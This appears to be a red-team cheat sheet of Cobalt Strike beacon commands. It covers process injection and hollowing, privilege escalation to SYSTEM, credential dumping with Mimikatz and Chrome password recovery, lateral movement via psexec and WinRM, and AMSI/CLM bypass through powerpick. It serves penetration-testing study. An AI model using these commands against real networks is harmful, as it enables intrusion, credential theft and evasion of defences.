

  
  

### Upload and Download payloads and files

```Command

Download <file>

Upload <file>

```

  

### Running Commands

  

```command

shell <command>

  

run <command>

  

powershell <command>

```

  
  

### Process Injection

  

```command

inject <pid>

  

dllinject <pid> _(for reflective dll injection)_

  

dllload <pid> (_for loading an on-disk DLL to memory)_

  

spawnto <arch> <full-exe-path> (_for process hollowing)_

```

  
  

### SOCKS Proxy

```command

socks <port number>

```

  
  

### Privilege Escalation

```command

getsystem _(SYSTEM account impersonation using named pipes)_

  

elevate svc-exe [listener] _(creates a services that runs a payload as SYSTEM)_

```

  

### Credential and Hash Harvesting

``` command

hashdump

  

logonpasswords _(Using Mimikatz)_

  

chromedump _(Recover Google Chrome passwords from current user)_

```

  
  

### Network Enumeration

  

```command

portscan [targets] [ports] [discovery method]

  

net <commands> _(commands to find targets on the domain)_

```

  

### Lateral Movement

  

```command

jump psexec _(Run service EXE on remote host)_

  

jump psexec_psh _(Run a PowerShell one-liner on remote host via a service)_

  

jump winrm _(Run a PowerShell script via WinRM on remote host)_

  

_remote-exec <any of the above> (Run a single command using the above methods on remote host)_

```

  
  

- **run:** Execute OS commands using Win32 API calls.

- **shell:** Execute OS commands by spawning "cmd.exe /c".

- **powershell:** Execute commands by spawning "powershell.exe"

- **powershell-import:** Import a local powershell module in the current beacon process.

- **powerpick:** Execute powershell commands without spawning "powershell.exe", using only .net libraries and assemblies. (Bypasses AMSI and CLM)

- **drives:** List current system drives.

- **getuid:** Get current user uid.

- **sleep:** Set the interval and jitter of beacon's call back.
